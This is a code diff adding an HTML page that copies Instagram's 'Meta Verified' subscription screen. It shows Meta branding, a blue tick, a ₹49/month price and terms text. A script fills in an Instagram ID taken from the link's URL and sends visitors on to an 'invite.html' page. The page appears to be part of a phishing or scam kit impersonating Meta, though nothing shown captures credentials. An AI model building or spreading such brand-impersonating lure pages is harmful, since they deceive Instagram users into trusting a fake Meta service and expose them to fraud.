@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="back-arrow">←</span>
+        </div>
+        <div class="profile-section">
+            <div class="profile-pic"> <img src="Instagram.jpg"></div>
+            <h2 id="username">
+                <span id="userID">user id</span> 
+                <img src="bltick.png" alt="Blue Tick" class="blue-tick">
+            </h2>
+            <p class="meta-standard">Meta Verified Standard</p>
+        </div>
+        <div class="pricing">
+            <p>₹49/month for 1 profile</p>
+            <p class="tax-note">Price may include taxes when applicable.</p>
+        </div>
+        <div class="features">
+            <h3>What you get with your subscription</h3>
+            <ul>
+                <li>✔ A verified badge <br> <span>Shows up everywhere you do</span></li>
+                <li>✔ Increased account protection</li>
+                <li>✔ Enhanced support</li>
+                <li>✔ Upgraded profile features</li>
+                <li>✔ Unique stickers</li>
+            </ul>
+        </div>
+        <p class="terms">
+            By tapping Continue, you agree to the <span class="link">Meta Verified Terms of Service</span>. If Meta is unable to verify your identity, you'll receive a refund. You can cancel up to 24 hours before your next payment date. <span class="link">Learn more</span>
+        </p>
+        <button class="continue-btn" onclick="goToInvitePage()">Continue</button>
+    </div>
+
+    <script>
+        // URL से Instagram ID प्राप्त करें
+        const urlParams = new URLSearchParams(window.location.search);
+        const instaID = urlParams.get('id');
+
+        if (instaID) {
+            document.getElementById("userID").innerText = instaID; // केवल टेक्स्ट बदलें, HTML नहीं
+        }
+
+        function goToInvitePage() {
+            if (instaID) {
+                window.location.href = "invite.html?id=" + instaID;
+            } else {
+                alert("Invalid user ID.");
+            }
+        }
+    </script>
+</body>
+</html>
